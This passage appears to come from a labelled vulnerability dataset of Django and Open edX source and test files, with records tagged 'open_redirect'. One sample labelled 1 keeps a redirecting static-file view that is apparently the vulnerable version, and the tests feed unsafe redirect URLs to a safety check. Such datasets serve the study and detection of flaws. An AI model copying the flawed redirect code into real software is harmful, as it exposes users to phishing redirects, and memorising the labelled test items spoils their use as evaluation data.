header_mtime:\n            raise ValueError\n    except (AttributeError, ValueError, OverflowError):\n        return True\n    return False\n/n/n/ntests/view_tests/tests/test_static.py/n/nimport mimetypes\nimport unittest\nfrom os import path\nfrom urllib.parse import quote\n\nfrom django.conf.urls.static import static\nfrom django.core.exceptions import ImproperlyConfigured\nfrom django.http import FileResponse, HttpResponseNotModified\nfrom django.test import SimpleTestCase, override_settings\nfrom django.utils.http import http_date\nfrom django.views.static import was_modified_since\n\nfrom .. import urls\nfrom ..urls import media_dir\n\n\n@override_settings(DEBUG=True, ROOT_URLCONF='view_tests.urls')\nclass StaticTests(SimpleTestCase):\n    \"\"\"Tests django views in django/views/static.py\"\"\"\n\n    prefix = 'site_media'\n\n    def test_serve(self):\n        \"The static view can serve static media\"\n        media_files = ['file.txt', 'file.txt.gz', '%2F.txt']\n        for filename in media_files:\n            response = self.client.get('/%s/%s' % (self.prefix, quote(filename)))\n            response_content = b''.join(response)\n            file_path = path.join(media_dir, filename)\n            with open(file_path, 'rb') as fp:\n                self.assertEqual(fp.read(), response_content)\n            self.assertEqual(len(response_content), int(response['Content-Length']))\n            self.assertEqual(mimetypes.guess_type(file_path)[1], response.get('Content-Encoding', None))\n\n    def test_chunked(self):\n        \"The static view should stream files in chunks to avoid large memory usage\"\n        response = self.client.get('/%s/%s' % (self.prefix, 'long-line.txt'))\n        first_chunk = next(response.streaming_content)\n        self.assertEqual(len(first_chunk), FileResponse.block_size)\n        second_chunk = next(response.streaming_content)\n        response.close()\n        # strip() to prevent OS line endings from causing differences\n        self.assertEqual(len(second_chunk.strip()), 1449)\n\n    def test_unknown_mime_type(self):\n        response = self.client.get('/%s/file.unknown' % self.prefix)\n        self.assertEqual('application/octet-stream', response['Content-Type'])\n        response.close()\n\n    def test_copes_with_empty_path_component(self):\n        file_name = 'file.txt'\n        response = self.client.get('/%s//%s' % (self.prefix, file_name))\n        response_content = b''.join(response)\n        with open(path.join(media_dir, file_name), 'rb') as fp:\n            self.assertEqual(fp.read(), response_content)\n\n    def test_is_modified_since(self):\n        file_name = 'file.txt'\n        response = self.client.get(\n            '/%s/%s' % (self.prefix, file_name),\n            HTTP_IF_MODIFIED_SINCE='Thu, 1 Jan 1970 00:00:00 GMT'\n        )\n        response_content = b''.join(response)\n        with open(path.join(media_dir, file_name), 'rb') as fp:\n            self.assertEqual(fp.read(), response_content)\n\n    def test_not_modified_since(self):\n        file_name = 'file.txt'\n        response = self.client.get(\n            '/%s/%s' % (self.prefix, file_name),\n            HTTP_IF_MODIFIED_SINCE='Mon, 18 Jan 2038 05:14:07 GMT'\n            # This is 24h before max Unix time. Remember to fix Django and\n            # update this test well before 2038 :)\n        )\n        self.assertIsInstance(response, HttpResponseNotModified)\n\n    def test_invalid_if_modified_since(self):\n        \"\"\"Handle bogus If-Modified-Since values gracefully\n\n        Assume that a file is modified since an invalid timestamp as per RFC\n        2616, section 14.25.\n        \"\"\"\n        file_name = 'file.txt'\n        invalid_date = 'Mon, 28 May 999999999999 28:25:26 GMT'\n        response = self.client.get('/%s/%s' % (self.prefix, file_name),\n                                   HTTP_IF_MODIFIED_SINCE=invalid_date)\n        response_content = b''.join(response)\n        with open(path.join(media_dir, file_name), 'rb') as fp:\n            self.assertEqual(fp.read(), response_content)\n        self.assertEqual(len(response_content), int(response['Content-Length']))\n\n    def test_invalid_if_modified_since2(self):\n        \"\"\"Handle even more bogus If-Modified-Since values gracefully\n\n        Assume that a file is modified since an invalid timestamp as per RFC\n        2616, section 14.25.\n        \"\"\"\n        file_name = 'file.txt'\n        invalid_date = ': 1291108438, Wed, 20 Oct 2010 14:05:00 GMT'\n        response = self.client.get('/%s/%s' % (self.prefix, file_name),\n                                   HTTP_IF_MODIFIED_SINCE=invalid_date)\n        response_content = b''.join(response)\n        with open(path.join(media_dir, file_name), 'rb') as fp:\n            self.assertEqual(fp.read(), response_content)\n        self.assertEqual(len(response_content), int(response['Content-Length']))\n\n    def test_404(self):\n        response = self.client.get('/%s/nonexistent_resource' % self.prefix)\n        self.assertEqual(404, response.status_code)\n\n    def test_index(self):\n        response = self.client.get('/%s/' % self.prefix)\n        self.assertContains(response, 'Index of ./')\n\n\nclass StaticHelperTest(StaticTests):\n    \"\"\"\n    Test case to make sure the static URL pattern helper works as expected\n    \"\"\"\n    def setUp(self):\n        super().setUp()\n        self._old_views_urlpatterns = urls.urlpatterns[:]\n        urls.urlpatterns += static('/media/', document_root=media_dir)\n\n    def tearDown(self):\n        super().tearDown()\n        urls.urlpatterns = self._old_views_urlpatterns\n\n    def test_prefix(self):\n        self.assertEqual(static('test')[0].regex.pattern, '^test(?P<path>.*)$')\n\n    @override_settings(DEBUG=False)\n    def test_debug_off(self):\n        \"\"\"No URLs are served if DEBUG=False.\"\"\"\n        self.assertEqual(static('test'), [])\n\n    def test_empty_prefix(self):\n        with self.assertRaisesMessage(ImproperlyConfigured, 'Empty static prefix not permitted'):\n            static('')\n\n    def test_special_prefix(self):\n        \"\"\"No URLs are served if prefix contains '://'.\"\"\"\n        self.assertEqual(static('http://'), [])\n\n\nclass StaticUtilsTests(unittest.TestCase):\n    def test_was_modified_since_fp(self):\n        \"\"\"\n        A floating point mtime does not disturb was_modified_since (#18675).\n        \"\"\"\n        mtime = 1343416141.107817\n        header = http_date(mtime)\n        self.assertFalse(was_modified_since(header, mtime))\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "a1f948b468b6621083a03b0d53432341b7a4d753", "code": "/django/views/static.py/n/n\"\"\"\nViews and functions for serving static files. These are only to be used\nduring development, and SHOULD NOT be used in a production setting.\n\"\"\"\nimport mimetypes\nimport os\nimport posixpath\nimport re\nimport stat\n\nfrom django.http import (\n    FileResponse, Http404, HttpResponse, HttpResponseNotModified,\n    HttpResponseRedirect,\n)\nfrom django.template import Context, Engine, TemplateDoesNotExist, loader\nfrom django.utils.http import http_date, parse_http_date\nfrom django.utils.translation import gettext as _, gettext_lazy\n\n\ndef serve(request, path, document_root=None, show_indexes=False):\n    \"\"\"\n    Serve static files below a given point in the directory structure.\n\n    To use, put a URL pattern such as::\n\n        from django.views.static import serve\n\n        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})\n\n    in your URLconf. You must provide the ``document_root`` param. You may\n    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index\n    of the directory.  This index view will use the template hardcoded below,\n    but if you'd like to override it, you can create a template called\n    ``static/directory_index.html``.\n    \"\"\"\n    path = posixpath.normpath(path)\n    path = path.lstrip('/')\n    newpath = ''\n    for part in path.split('/'):\n        if not part:\n            # Strip empty path components.\n            continue\n        drive, part = os.path.splitdrive(part)\n        head, part = os.path.split(part)\n        if part in (os.curdir, os.pardir):\n            # Strip '.' and '..' in path.\n            continue\n        newpath = os.path.join(newpath, part).replace('\\\\', '/')\n    if newpath and path != newpath:\n        return HttpResponseRedirect(newpath)\n    fullpath = os.path.join(document_root, newpath)\n    if os.path.isdir(fullpath):\n        if show_indexes:\n            return directory_index(newpath, fullpath)\n        raise Http404(_(\"Directory indexes are not allowed here.\"))\n    if not os.path.exists(fullpath):\n        raise Http404(_('\"%(path)s\" does not exist') % {'path': fullpath})\n    # Respect the If-Modified-Since header.\n    statobj = os.stat(fullpath)\n    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),\n                              statobj.st_mtime, statobj.st_size):\n        return HttpResponseNotModified()\n    content_type, encoding = mimetypes.guess_type(fullpath)\n    content_type = content_type or 'application/octet-stream'\n    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)\n    response[\"Last-Modified\"] = http_date(statobj.st_mtime)\n    if stat.S_ISREG(statobj.st_mode):\n        response[\"Content-Length\"] = statobj.st_size\n    if encoding:\n        response[\"Content-Encoding\"] = encoding\n    return response\n\n\nDEFAULT_DIRECTORY_INDEX_TEMPLATE = \"\"\"\n{% load i18n %}\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta http-equiv=\"Content-Language\" content=\"en-us\" />\n    <meta name=\"robots\" content=\"NONE,NOARCHIVE\" />\n    <title>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</title>\n  </head>\n  <body>\n    <h1>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</h1>\n    <ul>\n      {% if directory != \"/\" %}\n      <li><a href=\"../\">../</a></li>\n      {% endif %}\n      {% for f in file_list %}\n      <li><a href=\"{{ f|urlencode }}\">{{ f }}</a></li>\n      {% endfor %}\n    </ul>\n  </body>\n</html>\n\"\"\"\ntemplate_translatable = gettext_lazy(\"Index of %(directory)s\")\n\n\ndef directory_index(path, fullpath):\n    try:\n        t = loader.select_template([\n            'static/directory_index.html',\n            'static/directory_index',\n        ])\n    except TemplateDoesNotExist:\n        t = Engine(libraries={'i18n': 'django.templatetags.i18n'}).from_string(DEFAULT_DIRECTORY_INDEX_TEMPLATE)\n    files = []\n    for f in os.listdir(fullpath):\n        if not f.startswith('.'):\n            if os.path.isdir(os.path.join(fullpath, f)):\n                f += '/'\n            files.append(f)\n    c = Context({\n        'directory': path + '/',\n        'file_list': files,\n    })\n    return HttpResponse(t.render(c))\n\n\ndef was_modified_since(header=None, mtime=0, size=0):\n    \"\"\"\n    Was something modified since the user last downloaded it?\n\n    header\n      This is the value of the If-Modified-Since header.  If this is None,\n      I'll just return True.\n\n    mtime\n      This is the modification time of the item we're talking about.\n\n    size\n      This is the size of the item we're talking about.\n    \"\"\"\n    try:\n        if header is None:\n            raise ValueError\n        matches = re.match(r\"^([^;]+)(; length=([0-9]+))?$\", header,\n                           re.IGNORECASE)\n        header_mtime = parse_http_date(matches.group(1))\n        header_len = matches.group(3)\n        if header_len and int(header_len) != size:\n            raise ValueError\n        if int(mtime) > header_mtime:\n            raise ValueError\n    except (AttributeError, ValueError, OverflowError):\n        return True\n    return False\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "43b55308a6467a5b8880bb40b71ec0821cb76398", "code": "common/djangoapps/student/helpers.py/n/n\"\"\"Helpers for the student app. \"\"\"\nimport logging\nimport mimetypes\nimport urllib\nimport urlparse\nfrom datetime import datetime\n\nfrom django.conf import settings\nfrom django.core.urlresolvers import NoReverseMatch, reverse\nfrom django.utils import http\nfrom oauth2_provider.models import AccessToken as dot_access_token\nfrom oauth2_provider.models import RefreshToken as dot_refresh_token\nfrom provider.oauth2.models import AccessToken as dop_access_token\nfrom provider.oauth2.models import RefreshToken as dop_refresh_token\nfrom pytz import UTC\n\nimport third_party_auth\nfrom course_modes.models import CourseMode\nfrom lms.djangoapps.verify_student.models import SoftwareSecurePhotoVerification, VerificationDeadline\nfrom openedx.core.djangoapps.site_configuration import helpers as configuration_helpers\nfrom openedx.core.djangoapps.theming.helpers import get_themes\n\n# Enumeration of per-course verification statuses\n# we display on the student dashboard.\nVERIFY_STATUS_NEED_TO_VERIFY = \"verify_need_to_verify\"\nVERIFY_STATUS_SUBMITTED = \"verify_submitted\"\nVERIFY_STATUS_RESUBMITTED = \"re_verify_submitted\"\nVERIFY_STATUS_APPROVED = \"verify_approved\"\nVERIFY_STATUS_MISSED_DEADLINE = \"verify_missed_deadline\"\nVERIFY_STATUS_NEED_TO_REVERIFY = \"verify_need_to_reverify\"\n\nDISABLE_UNENROLL_CERT_STATES = [\n    'generating',\n    'ready',\n]\n\n\nlog = logging.getLogger(__name__)\n\n\ndef check_verify_status_by_course(user, course_enrollments):\n    \"\"\"\n    Determine the per-course verification statuses for a given user.\n\n    The possible statuses are:\n        * VERIFY_STATUS_NEED_TO_VERIFY: The student has not yet submitted photos for verification.\n        * VERIFY_STATUS_SUBMITTED: The student has submitted photos for verification,\n          but has have not yet been approved.\n        * VERIFY_STATUS_RESUBMITTED: The student has re-submitted photos for re-verification while\n          they still have an active but expiring ID verification\n        * VERIFY_STATUS_APPROVED: The student has been successfully verified.\n        * VERIFY_STATUS_MISSED_DEADLINE: The student did not submit photos within the course's deadline.\n        * VERIFY_STATUS_NEED_TO_REVERIFY: The student has an active verification, but it is\n            set to expire before the verification deadline for the course.\n\n    It is is also possible that a course does NOT have a verification status if:\n        * The user is not enrolled in a verified mode, meaning that the user didn't pay.\n        * The course does not offer a verified mode.\n        * The user submitted photos but an error occurred while verifying them.\n        * The user submitted photos but the verification was denied.\n\n    In the last two cases, we rely on messages in the sidebar rather than displaying\n    messages for each course.\n\n    Arguments:\n        user (User): The currently logged-in user.\n        course_enrollments (list[CourseEnrollment]): The courses the user is enrolled in.\n\n    Returns:\n        dict: Mapping of course keys verification status dictionaries.\n            If no verification status is applicable to a course, it will not\n            be included in the dictionary.\n            The dictionaries have these keys:\n                * status (str): One of the enumerated status codes.\n                * days_until_deadline (int): Number of days until the verification deadline.\n                * verification_good_until (str): Date string for the verification expiration date.\n\n    \"\"\"\n    status_by_course = {}\n\n    # Retrieve all verifications for the user, sorted in descending\n    # order by submission datetime\n    verifications = SoftwareSecurePhotoVerification.objects.filter(user=user)\n\n    # Check whether the user has an active or pending verification attempt\n    # To avoid another database hit, we re-use the queryset we have already retrieved.\n    has_active_or_pending = SoftwareSecurePhotoVerification.user_has_valid_or_pending(\n        user, queryset=verifications\n    )\n\n    # Retrieve expiration_datetime of most recent approved verification\n    # To avoid another database hit, we re-use the queryset we have already retrieved.\n    expiration_datetime = SoftwareSecurePhotoVerification.get_expiration_datetime(user, verifications)\n    verification_expiring_soon = SoftwareSecurePhotoVerification.is_verification_expiring_soon(expiration_datetime)\n\n    # Retrieve verification deadlines for the enrolled courses\n    enrolled_course_keys = [enrollment.course_id for enrollment in course_enrollments]\n    course_deadlines = VerificationDeadline.deadlines_for_courses(enrolled_course_keys)\n\n    recent_verification_datetime = None\n\n    for enrollment in course_enrollments:\n\n        # If the user hasn't enrolled as verified, then the course\n        # won't display state related to its verification status.\n        if enrollment.mode in CourseMode.VERIFIED_MODES:\n\n            # Retrieve the verification deadline associated with the course.\n            # This could be None if the course doesn't have a deadline.\n            deadline = course_deadlines.get(enrollment.course_id)\n\n            relevant_verification = SoftwareSecurePhotoVerification.verification_for_datetime(deadline, verifications)\n\n            # Picking the max verification datetime on each iteration only with approved status\n            if relevant_verification is not None and relevant_verification.status == \"approved\":\n                recent_verification_datetime = max(\n                    recent_verification_datetime if recent_verification_datetime is not None\n                    else relevant_verification.expiration_datetime,\n                    relevant_verification.expiration_datetime\n                )\n\n            # By default, don't show any status related to verification\n            status = None\n\n            # Check whether the user was approved or is awaiting approval\n            if relevant_verification is not None:\n                if relevant_verification.status == \"approved\":\n                    if verification_expiring_soon:\n                        status = VERIFY_STATUS_NEED_TO_REVERIFY\n                    else:\n                        status = VERIFY_STATUS_APPROVED\n                elif relevant_verification.status == \"submitted\":\n                    if verification_expiring_soon:\n                        status = VERIFY_STATUS_RESUBMITTED\n                    else:\n                        status = VERIFY_STATUS_SUBMITTED\n\n            # If the user didn't submit at all, then tell them they need to verify\n            # If the deadline has already passed, then tell them they missed it.\n            # If they submitted but something went wrong (error or denied),\n            # then don't show any messaging next to the course, since we already\n            # show messages related to this on the left sidebar.\n            submitted = (\n                relevant_verification is not None and\n                relevant_verification.status not in [\"created\", \"ready\"]\n            )\n            if status is None and not submitted:\n                if deadline is None or deadline > datetime.now(UTC):\n                    if SoftwareSecurePhotoVerification.user_is_verified(user):\n                        if verification_expiring_soon:\n                            # The user has an active verification, but the verification\n                            # is set to expire within \"EXPIRING_SOON_WINDOW\" days (default is 4 weeks).\n                            # Tell the student to reverify.\n                            status = VERIFY_STATUS_NEED_TO_REVERIFY\n                    else:\n                        status = VERIFY_STATUS_NEED_TO_VERIFY\n                else:\n                    # If a user currently has an active or pending verification,\n                    # then they may have submitted an additional attempt after\n                    # the verification deadline passed.  This can occur,\n                    # for example, when the support team asks a student\n                    # to reverify after the deadline so they can receive\n                    # a verified certificate.\n                    # In this case, we still want to show them as \"verified\"\n                    # on the dashboard.\n                    if has_active_or_pending:\n                        status = VERIFY_STATUS_APPROVED\n\n                    # Otherwise, the student missed the deadline, so show\n                    # them as \"honor\" (the kind of certificate they will receive).\n                    else:\n                        status = VERIFY_STATUS_MISSED_DEADLINE\n\n            # Set the status for the course only if we're displaying some kind of message\n            # Otherwise, leave the course out of the dictionary.\n            if status is not None:\n                days_until_deadline = None\n\n                now = datetime.now(UTC)\n                if deadline is not None and deadline > now:\n                    days_until_deadline = (deadline - now).days\n\n                status_by_course[enrollment.course_id] = {\n                    'status': status,\n                    'days_until_deadline': days_until_deadline\n                }\n\n    if recent_verification_datetime:\n        for key, value in status_by_course.iteritems():  # pylint: disable=unused-variable\n            status_by_course[key]['verification_good_until'] = recent_verification_datetime.strftime(\"%m/%d/%Y\")\n\n    return status_by_course\n\n\ndef auth_pipeline_urls(auth_entry, redirect_url=None):\n    \"\"\"Retrieve URLs for each enabled third-party auth provider.\n\n    These URLs are used on the \"sign up\" and \"sign in\" buttons\n    on the login/registration forms to allow users to begin\n    authentication with a third-party provider.\n\n    Optionally, we can redirect the user to an arbitrary\n    url after auth completes successfully.  We use this\n    to redirect the user to a page that required login,\n    or to send users to the payment flow when enrolling\n    in a course.\n\n    Args:\n        auth_entry (string): Either `pipeline.AUTH_ENTRY_LOGIN` or `pipeline.AUTH_ENTRY_REGISTER`\n\n    Keyword Args:\n        redirect_url (unicode): If provided, send users to this URL\n            after they successfully authenticate.\n\n    Returns:\n        dict mapping provider IDs to URLs\n\n    \"\"\"\n    if not third_party_auth.is_enabled():\n        return {}\n\n    return {\n        provider.provider_id: third_party_auth.pipeline.get_login_url(\n            provider.provider_id, auth_entry, redirect_url=redirect_url\n        ) for provider in third_party_auth.provider.Registry.displayed_for_login()\n    }\n\n\n# Query string parameters that can be passed to the \"finish_auth\" view to manage\n# things like auto-enrollment.\nPOST_AUTH_PARAMS = ('course_id', 'enrollment_action', 'course_mode', 'email_opt_in', 'purchase_workflow')\n\n\ndef get_next_url_for_login_page(request):\n    \"\"\"\n    Determine the URL to redirect to following login/registration/third_party_auth\n\n    The user is currently on a login or registration page.\n    If 'course_id' is set, or other POST_AUTH_PARAMS, we will need to send the user to the\n    /account/finish_auth/ view following login, which will take care of auto-enrollment in\n    the specified course.\n\n    Otherwise, we go to the ?next= query param or to the dashboard if nothing else is\n    specified.\n\n    If THIRD_PARTY_AUTH_HINT is set, then `tpa_hint=<hint>` is added as a query parameter.\n    \"\"\"\n    redirect_to = get_redirect_to(request)\n    if not redirect_to:\n        try:\n            redirect_to = reverse('dashboard')\n        except NoReverseMatch:\n            redirect_to = reverse('home')\n\n    if any(param in request.GET for param in POST_AUTH_PARAMS):\n        # Before we redirect to next/dashboard, we need to handle auto-enrollment:\n        params = [(param, request.GET[param]) for param in POST_AUTH_PARAMS if param in request.GET]\n        params.append(('next', redirect_to))  # After auto-enrollment, user will be sent to payment page or to this URL\n        redirect_to = '{}?{}'.format(reverse('finish_auth'), urllib.urlencode(params))\n        # Note: if we are resuming a third party auth pipeline, then the next URL will already\n        # be saved in the session as part of the pipeline state. That URL will take priority\n        # over this one.\n\n    # Append a tpa_hint query parameter, if one is configured\n    tpa_hint = configuration_helpers.get_value(\n        \"THIRD_PARTY_AUTH_HINT\",\n        settings.FEATURES.get(\"THIRD_PARTY_AUTH_HINT\", '')\n    )\n    if tpa_hint:\n        # Don't add tpa_hint if we're already in the TPA pipeline (prevent infinite loop),\n        # and don't overwrite any existing tpa_hint params (allow tpa_hint override).\n        running_pipeline = third_party_auth.pipeline.get(request)\n        (scheme, netloc, path, query, fragment) = list(urlparse.urlsplit(redirect_to))\n        if not running_pipeline and 'tpa_hint' not in query:\n            params = urlparse.parse_qs(query)\n            params['tpa_hint'] = [tpa_hint]\n            query = urllib.urlencode(params, doseq=True)\n            redirect_to = urlparse.urlunsplit((scheme, netloc, path, query, fragment))\n\n    return redirect_to\n\n\ndef get_redirect_to(request):\n    \"\"\"\n    Determine the redirect url and return if safe\n    :argument\n        request: request object\n\n    :returns: redirect url if safe else None\n    \"\"\"\n    redirect_to = request.GET.get('next')\n    header_accept = request.META.get('HTTP_ACCEPT', '')\n\n    # If we get a redirect parameter, make sure it's safe i.e. not redirecting outside our domain.\n    # Also make sure that it is not redirecting to a static asset and redirected page is web page\n    # not a static file. As allowing assets to be pointed to by \"next\" allows 3rd party sites to\n    # get information about a user on edx.org. In any such case drop the parameter.\n    if redirect_to:\n        mime_type, _ = mimetypes.guess_type(redirect_to, strict=False)\n        if not http.is_safe_url(redirect_to):\n            log.warning(\n                u'Unsafe redirect parameter detected after login page: %(redirect_to)r',\n                {\"redirect_to\": redirect_to}\n            )\n            redirect_to = None\n        elif 'text/html' not in header_accept:\n            log.warning(\n                u'Redirect to non html content %(content_type)r detected from %(user_agent)r'\n                u' after login page: %(redirect_to)r',\n                {\n                    \"redirect_to\": redirect_to, \"content_type\": header_accept,\n                    \"user_agent\": request.META.get('HTTP_USER_AGENT', '')\n                }\n            )\n            redirect_to = None\n        elif mime_type:\n            log.warning(\n                u'Redirect to url path with specified filed type %(mime_type)r not allowed: %(redirect_to)r',\n                {\"redirect_to\": redirect_to, \"mime_type\": mime_type}\n            )\n            redirect_to = None\n        elif settings.STATIC_URL in redirect_to:\n            log.warning(\n                u'Redirect to static content detected after login page: %(redirect_to)r',\n                {\"redirect_to\": redirect_to}\n            )\n            redirect_to = None\n        else:\n            themes = get_themes()\n            for theme in themes:\n                if theme.theme_dir_name in redirect_to:\n                    log.warning(\n                        u'Redirect to theme content detected after login page: %(redirect_to)r',\n                        {\"redirect_to\": redirect_to}\n                    )\n                    redirect_to = None\n                    break\n\n    return redirect_to\n\n\ndef destroy_oauth_tokens(user):\n    \"\"\"\n    Destroys ALL OAuth access and refresh tokens for the given user.\n    \"\"\"\n    dop_access_token.objects.filter(user=user.id).delete()\n    dop_refresh_token.objects.filter(user=user.id).delete()\n    dot_access_token.objects.filter(user=user.id).delete()\n    dot_refresh_token.objects.filter(user=user.id).delete()\n/n/n/ncommon/djangoapps/student/tests/test_helpers.py/n/n\"\"\" Test Student helpers \"\"\"\n\nimport logging\n\nimport ddt\nfrom django.conf import settings\nfrom django.contrib.sessions.middleware import SessionMiddleware\nfrom django.core.urlresolvers import reverse\nfrom django.test import TestCase\nfrom django.test.client import RequestFactory\nfrom django.test.utils import override_settings\nfrom mock import patch\nfrom testfixtures import LogCapture\n\nfrom student.helpers import get_next_url_for_login_page\nfrom openedx.core.djangoapps.site_configuration.tests.test_util import with_site_configuration_context\n\nLOGGER_NAME = \"student.helpers\"\n\n\n@ddt.ddt\nclass TestLoginHelper(TestCase):\n    \"\"\"Test login helper methods.\"\"\"\n    static_url = settings.STATIC_URL\n\n    def setUp(self):\n        super(TestLoginHelper, self).setUp()\n        self.request = RequestFactory()\n\n    @staticmethod\n    def _add_session(request):\n        \"\"\"Annotate the request object with a session\"\"\"\n        middleware = SessionMiddleware()\n        middleware.process_request(request)\n        request.session.save()\n\n    @ddt.data(\n        (\"https://www.amazon.com\", \"text/html\", None,\n         \"Unsafe redirect parameter detected after login page: u'https://www.amazon.com'\"),\n        (\"favicon.ico\", \"image/*\", \"test/agent\",\n         \"Redirect to non html content 'image/*' detected from 'test/agent' after login page: u'favicon.ico'\"),\n        (\"https://www.test.com/test.jpg\", \"image/*\", None,\n         \"Unsafe redirect parameter detected after login page: u'https://www.test.com/test.jpg'\"),\n        (static_url + \"dummy.png\", \"image/*\", \"test/agent\",\n         \"Redirect to non html content 'image/*' detected from 'test/agent' after login page: u'\" + static_url +\n         \"dummy.png\" + \"'\"),\n        (\"test.png\", \"text/html\", None,\n         \"Redirect to url path with specified filed type 'image/png' not allowed: u'test.png'\"),\n        (static_url + \"dummy.png\", \"text/html\", None,\n         \"Redirect to url path with specified filed type 'image/png' not allowed: u'\" + static_url + \"dummy.png\" + \"'\"),\n    )\n    @ddt.unpack\n    def test_unsafe_next(self, unsafe_url, http_accept, user_agent, expected_log):\n        \"\"\" Test unsafe next parameter \"\"\"\n        with LogCapture(LOGGER_NAME, level=logging.WARNING) as logger:\n            req = self.request.get(reverse(\"login\") + \"?next={url}\".format(url=unsafe_url))\n            req.META[\"HTTP_ACCEPT\"] = http_accept  # pylint: disable=no-member\n            req.META[\"HTTP_USER_AGENT\"] = user_agent  # pylint: disable=no-member\n            get_next_url_for_login_page(req)\n            logger.check(\n                (LOGGER_NAME, \"WARNING\", expected_log)\n            )\n\n    def test_safe_next(self):\n        \"\"\" Test safe next parameter \"\"\"\n        req = self.request.get(reverse(\"login\") + \"?next={url}\".format(url=\"/dashboard\"))\n        req.META[\"HTTP_ACCEPT\"] = \"text/html\"  # pylint: disable=no-member\n        next_page = get_next_url_for_login_page(req)\n        self.assertEqual(next_page, u'/dashboard')\n\n    @patch('student.helpers.third_party_auth.pipeline.get')\n    @ddt.data(\n        # Test requests outside the TPA pipeline - tpa_hint should be added.\n        (None, '/dashboard', '/dashboard', False),\n        ('', '/dashboard', '/dashboard', False),\n        ('', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', False),\n        ('saml-idp', '/dashboard', '/dashboard?tpa_hint=saml-idp', False),\n        # THIRD_PARTY_AUTH_HINT can be overridden via the query string\n        ('saml-idp', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', False),\n\n        # Test requests inside the TPA pipeline - tpa_hint should not be added, preventing infinite loop.\n        (None, '/dashboard', '/dashboard', True),\n        ('', '/dashboard', '/dashboard', True),\n        ('', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', True),\n        ('saml-idp', '/dashboard', '/dashboard', True),\n        # OK to leave tpa_hint overrides in place.\n        ('saml-idp', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', True),\n    )\n    @ddt.unpack\n    def test_third_party_auth_hint(self, tpa_hint, next_url, expected_url, running_pipeline, mock_running_pipeline):\n        mock_running_pipeline.return_value = running_pipeline\n\n        def validate_login():\n            req = self.request.get(reverse(\"login\") + \"?next={url}\".format(url=next_url))\n            req.META[\"HTTP_ACCEPT\"] = \"text/html\"  # pylint: disable=no-member\n            self._add_session(req)\n            next_page = get_next_url_for_login_page(req)\n            self.assertEqual(next_page, expected_url)\n\n        with override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT=tpa_hint)):\n            validate_login()\n\n        with with_site_configuration_context(configuration=dict(THIRD_PARTY_AUTH_HINT=tpa_hint)):\n            validate_login()\n/n/n/nlms/djangoapps/student_account/test/test_views.py/n/n# -*- coding: utf-8 -*-\n\"\"\" Tests for student account views. \"\"\"\n\nimport logging\nimport re\nfrom unittest import skipUnless\nfrom urllib import urlencode\n\nimport ddt\nimport mock\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.messages.middleware import MessageMiddleware\nfrom django.core import mail\nfrom django.core.files.uploadedfile import SimpleUploadedFile\nfrom django.core.urlresolvers import reverse\nfrom django.http import HttpRequest\nfrom django.test import TestCase\nfrom django.test.utils import override_settings\nfrom edx_oauth2_provider.tests.factories import AccessTokenFactory, ClientFactory, RefreshTokenFactory\nfrom edx_rest_api_client import exceptions\nfrom nose.plugins.attrib import attr\nfrom oauth2_provider.models import AccessToken as dot_access_token\nfrom oauth2_provider.models import RefreshToken as dot_refresh_token\nfrom provider.oauth2.models import AccessToken as dop_access_token\nfrom provider.oauth2.models import RefreshToken as dop_refresh_token\nfrom testfixtures import LogCapture\n\nfrom commerce.models import CommerceConfiguration\nfrom commerce.tests import factories\nfrom commerce.tests.mocks import mock_get_orders\nfrom course_modes.models import CourseMode\nfrom edxmako.shortcuts import render_to_response\nfrom openedx.core.djangoapps.oauth_dispatch.tests import factories as dot_factories\nfrom openedx.core.djangoapps.programs.tests.mixins import ProgramsApiConfigMixin\nfrom openedx.core.djangoapps.site_configuration.tests.mixins import SiteMixin\nfrom openedx.core.djangoapps.theming.tests.test_util import with_comprehensive_theme_context\nfrom openedx.core.djangoapps.user_api.accounts import EMAIL_MAX_LENGTH\nfrom openedx.core.djangoapps.user_api.accounts.api import activate_account, create_account\nfrom openedx.core.djangolib.js_utils import dump_js_escaped_json\nfrom openedx.core.djangolib.testing.utils import CacheIsolationTestCase\nfrom student.tests.factories import UserFactory\nfrom student_account.views import account_settings_context, get_user_orders\nfrom third_party_auth.tests.testutil import ThirdPartyAuthTestMixin, simulate_running_pipeline\nfrom util.testing import UrlResetMixin\nfrom xmodule.modulestore.tests.django_utils import ModuleStoreTestCase\n\nLOGGER_NAME = 'audit'\nUser = get_user_model()  # pylint:disable=invalid-name\n\n\n@ddt.ddt\nclass StudentAccountUpdateTest(CacheIsolationTestCase, UrlResetMixin):\n    \"\"\" Tests for the student account views that update the user's account information. \"\"\"\n\n    USERNAME = u\"heisenberg\"\n    ALTERNATE_USERNAME = u\"walt\"\n    OLD_PASSWORD = u\"\u1e05\u1e37\u00fc\u00eb\u1e61\u1e33\u00ff\"\n    NEW_PASSWORD = u\"\ud83c\udd31\ud83c\udd38\ud83c\udd36\ud83c\udd31\ud83c\udd3b\ud83c\udd44\ud83c\udd34\"\n    OLD_EMAIL = u\"walter@graymattertech.com\"\n    NEW_EMAIL = u\"walt@savewalterwhite.com\"\n\n    INVALID_ATTEMPTS = 100\n\n    INVALID_EMAILS = [\n        None,\n        u\"\",\n        u\"a\",\n        \"no_domain\",\n        \"no+domain\",\n        \"@\",\n        \"@domain.com\",\n        \"test@no_extension\",\n\n        # Long email -- subtract the length of the @domain\n        # except for one character (so we exceed the max length limit)\n        u\"{user}@example.com\".format(\n            user=(u'e' * (EMAIL_MAX_LENGTH - 11))\n        )\n    ]\n\n    